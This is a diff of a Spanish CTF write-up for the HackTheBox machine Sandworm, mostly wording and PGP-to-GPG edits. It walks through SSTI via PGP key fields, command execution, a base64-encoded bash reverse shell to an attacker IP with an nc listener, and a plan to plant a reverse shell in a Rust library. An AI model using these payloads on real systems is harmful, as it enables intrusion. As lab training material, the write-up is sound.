@@ -68,7 +68,7 @@ PORT    STATE SERVICE  VERSION
 ######
 ```
 
-Podemos ver que existen un servicio **Web** que nos redirige a **HTTPS** en un dominio llamado `ssa.htb`. Si hacemos un `ping` a este nombre veremos que hay un problema, y es que nuestra máquina no conoce la **IP** a la que está asociada
+Podemos ver que existen un servicio **Web** que nos redirige a **HTTPS** en un dominio llamado `ssa.htb`. Si hacemos un `ping` a este nombre veremos que hay un problema, y es que nuestra máquina no conoce la **IP** a la que está asociada.
 
 ```bash
 $ ping -c 1 ssa.htb
@@ -94,24 +94,26 @@ Explorando la página podemos ver algo en la sección de contacto en la que habl
 
 ![contact ssa.htb](ssa-contact.png)
 
-Una opción sería probar un **Cross  Site Scripting (XSS)** esperando que un usuario vea los mensaje que se envían, pero no es el vector correcto. Al final del formulario vemos que dice **"Don't know how to use PGP? Check out our guide"** que nos muestra algunas funciones para hacer ciertas cosas con **PGP**
+Una opción sería probar un **Cross  Site Scripting (XSS)** esperando que un usuario vea los mensaje que se envían, pero no es el vector correcto. Al final del formulario vemos que dice **"Don't know how to use PGP? Check out our guide"** que nos muestra algunas funciones para hacer ciertas cosas con **PGP/GPG**.
 
-![pgp guide ssa.htb](ssa-guide.png)
+![gpg guide ssa.htb](ssa-guide.png)
 
-También nos comparte una clave pública PGP **"Practice by importing our public key and encrypting, signing, and verifying messages."** con la que podemos operar para practicar.
+También nos comparte una clave pública **PGP** con la que podemos operar para probar cosas.
 
-![pgp public key ssa.htb](ssa-pgpkey.png)
+![gpg public key ssa.htb](ssa-gpgkey.png)
 
-### PGP
-**Pretty Good Privacy** es un programa que te permite cifrar información. Utiliza una combinación de técnicas de cifrado como hash, compresión de datos, criptografía simétrica y criptografía asimétrica para mantener la seguridad y la autenticidad de los datos. **PGP** es un criptosistema híbrido que combina lo mejor de ambos tipos de cifrado. También se puede usar **PGP** para firmar digitalmente mensajes y archivos, lo que permite verificar la identidad, valides y evitar falsificación.
+### PGP/GPG
+**Pretty Good Privacy** es un software que permite cifrar información. Utiliza una combinación de técnicas de cifrado como hash, compresión de datos, criptografía simétrica y criptografía asimétrica para mantener la seguridad y la autenticidad de los datos. **PGP** es un criptosistema híbrido que combina lo mejor de ambos tipos de cifrado. También se puede usar **PGP** para firmar digitalmente mensajes y archivos, lo que permite verificar la identidad, valides y evitar falsificación.
 
-En **linux** para usar este mecanismo de cifrado tenemos [GnuPG](https://gnupg.org/index.html). Para este CTF necesitaremos hacer muchas pruebas antes de continuar y `gpg` nos exporta todas las claves que usemos ya sean publicas o privadas a nuestro peril GnuPG, por lo que desarrollé una **Suite** de herramientas hechas con **Python3** llamada [pgp-pysuite](https://github.com/marcvspt/pgp-pysuite).
+En **linux** para usar **PGP** tenemos [GnuPG](https://gnupg.org/index.html). Para este **CTF** necesitaremos hacer muchas pruebas antes de continuar y `gpg` nos exporta todas las claves que usemos ya sean publicas o privadas a nuestro perfil **GnuPG**, por lo que desarrollé una herramienta hecha con **Python3** llamada [gpg-pysuite](https://github.com/marcvspt/gpg-pysuite) para aglizar los procesos criptográficos con **GPG**.
+
+**GPG: GNU Privacy Guard** es un sistema de cifrado y firmas digitales, que viene a ser un reemplazo de **PGP** pero con la principal diferencia que es software libre. Apartir de ahora haremos referencia a **PGP** como **GPG** a menos que sea para referenciar a la información que `ssa.htb` nos proporciona.
 
 ```bash
-$ python3 pgpysuite.py -h
-usage: pgpysuite.py [-h] {generate,encrypt,decrypt,sign,verify} ...
+$ python3 gpg_pysuite.py -h
+usage: gpg_pysuite.py [-h] {generate,encrypt,decrypt,sign,verify} ...
 
-PGP Python suite
+GPG Python suite
 
 positional arguments:
     {generate,encrypt,decrypt,sign,verify}
@@ -119,24 +121,24 @@ positional arguments:
 optional arguments:
     -h, --help          show this help message and exit
 ```
-Creamos un par de **claves PGP** y probamos algunas funciones de la página creando lo que nos pidan.
+Creamos un par de **claves GPG** y probamos algunas funciones de la página creando lo que nos pidan.
 
 ```bash
-$ python3 pgpysuite.py generate -p password123 -n marcvs -e marcvs@ssa.htb
+$ python3 gpg_pysuite.py generate -p password123 -n marcvs -e marcvs@ssa.htb
 
 [+] Keys generated successfully
 
 $ ls
-key_pgp.key.asc  key_pgp.pub.asc  pgpysuite.py
+file_gpg.priv.asc  file_gpg.pub.asc  gpg_pysuite.py
 ```
 
-Hay algo curioso y llamativo en una función de la página. Cuando verificamos la firma de un mensaje usando nuestra llave **pública PGP** nos muestra nuestro nombre.
+Hay algo curioso y llamativo en una función de la página. Cuando verificamos la firma de un mensaje usando nuestra llave **pública GPG** nos muestra nuestro nombre.
 
-![pgp verify ssa.htb](ssa-verify.png)
+![gpg verify ssa.htb](ssa-verify.png)
 
-Esto sucede, ya que, cuando creamos las **claves PGP**, nuestra información está embedida en nuestra clave pública para identificar a quién pertenece. Podemos verlo usando la aplicación online [GPG-DECODER](https://cirw.in/gpg-decoder/).
+Esto sucede, ya que, cuando creamos las **claves GPG**, nuestra información está embedida en nuestra clave pública para identificar a quién pertenece. Podemos verlo usando la aplicación online [GPG-DECODER](https://cirw.in/gpg-decoder/).
 
-![pgp decoder publi key](ssa-pgpdecoder.png)
+![gpg decoder public key](ssa-gpgdecoder.png)
 
 ## Usuario bajos privilegios
 ### SSTI
@@ -144,12 +146,13 @@ Podemos probar a hacer un **Server Side Template Injection**. Un **SSTI** es una
 
 Podemos suponer que la función que hace la verificación devuelve la información, el nombre y quizá el email e inyecta los datos en sus campos especiales de `flask` en el template. Vamos a hacer una prueba.
 
-Primero creamos el par de claves injectando un **SSTI** básico para `flask-jinja2`:
+Primero creamos el par de claves injectando un **SSTI** básico para `flask-jinja2`.
+
 ![payload ssti verify ssa.htb](ssa-ssti.png)
 
-Firmamos cualquier mensaje:
+Firmamos cualquier mensaje.
 ```bash
-$ python3 pgpysuite.py sign -c ssti-tests.pub.asc -k ssti-tests.key.asc -p password123 -m "Hola mundo"
+$ python3 gpg_pysuite.py sign -c ssti-tests.pub.asc -k ssti-tests.priv.asc -p password123 -m "Hola mundo"
 
 [+] Message signed successfully
 
@@ -161,16 +164,16 @@ Hola mundo
 #####
 ```
 
-¡Funciona! se ha interpretado correctamente nuestro payload y nos ha devuelto lo que nos esperabamos tanto en el nombre como en el email:
+¡Funciona! se ha interpretado correctamente nuestro payload y nos ha devuelto lo que nos esperabamos tanto en el nombre como en el email.
 
 ![ssti verify msg detection](ssa-ssti-detection.png)
 
 ### RCE
-Probemos algo sencillo como ejecutar un `id` usando la información de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) y/o [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti):
+Probemos algo sencillo como ejecutar un `id` usando la información de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) y/o [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti).
 
 ![ssti command id](ssa-ssti-id.png)
 
-Vemos que si funcionó y que somos el usuario `atlas`
+Vemos que si funcionó y que somos el usuario `atlas`.
 
 ![ssti command id response](ssa-ssti-id-res.png)
 
@@ -181,7 +184,11 @@ $ echo "bash -i >& /dev/tcp/10.10.14.176/443 0>&1" -n | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzYvNDQzIDA+JjEgLW4K
 ```
 
+Generamos las nuevas claves y la firma con el payload para enviarnos una **reverse shell.**
+
 ![ssti command reverse shell](ssa-ssti-revshell.png)
+
+Nos ponemos en escucha en el puerto al cual nos enviamos la **reverse shell**.
 
 ```bash
 $ nc -nlvp 443
@@ -200,7 +207,8 @@ atlas@sandworm:/var/www/html/SSA$
 ```
 
 ### Escapar del Sandbox
-Ya estamos en la máquina pero tenemos un problema, no podemos ejecutar varios comandos, estamos atrapados
+Ya estamos en la máquina pero tenemos un problema, no podemos ejecutar varios comandos, estamos atrapados.
+
 ```bash
 atlas@sandworm:/$ uname -a
 uname -a
@@ -273,7 +281,7 @@ f9d**************************637
 
 ## Escalada de privilegios
 ### Enumeración local
-Una via potencial de escalar privilegios es buscando ejecutables **SUID**, en este caso encontramos en `/opt/tipnet/target/debug/tipnet` uno que tiene como propietario a atlas, así que es posible que si logramos injectar un comando usando este binario lo hagamos como `atlas`
+Una via potencial de escalar privilegios es buscando ejecutables **SUID**, en este caso encontramos en `/opt/tipnet/target/debug/tipnet` uno que tiene como propietario a atlas, así que es posible que si logramos injectar un comando usando este binario lo hagamos como `atlas`.
 
 ```bash
 silentobserver@sandworm:/opt/tipnet/target/debug$ ls -la
@@ -290,7 +298,8 @@ drwxrwxr-x   6 atlas atlas     4096 Jun  6 11:49 incremental
 -rw-rw-r--   1 atlas atlas       87 May  4 17:24 tipnet.d
 ```
 
-Vamos a probar que hace esta herramienta:
+Vamos a probar que hace esta herramienta.
+
 ```bash
 silentobserver@sandworm:/opt/tipnet/target/debug$ ./tipnet
 
@@ -314,7 +323,7 @@ d) SQUARE (WIP)
 e) Refresh Indeces
 ```
 
-Investigando más la ruta `/opt/tipnet/src` vemos que podemos leer el código fuente de esta aplicación
+Investigando más la ruta `/opt/tipnet/src` vemos que podemos leer el código fuente de esta aplicación.
 
 ```rust
 extern crate logger;
@@ -551,7 +560,8 @@ Esto nos hace pensar en un ataque que implique modificar la función `pub fn log
 }
 ```
 
-Probemos a enviar una reverse shell a nuestra máquina modificando el `lib.rs`.
+Probemos a enviar una **reverse shell** a nuestra máquina modificando el `lib.rs`.
+
 ```rust
 extern crate chrono;
 
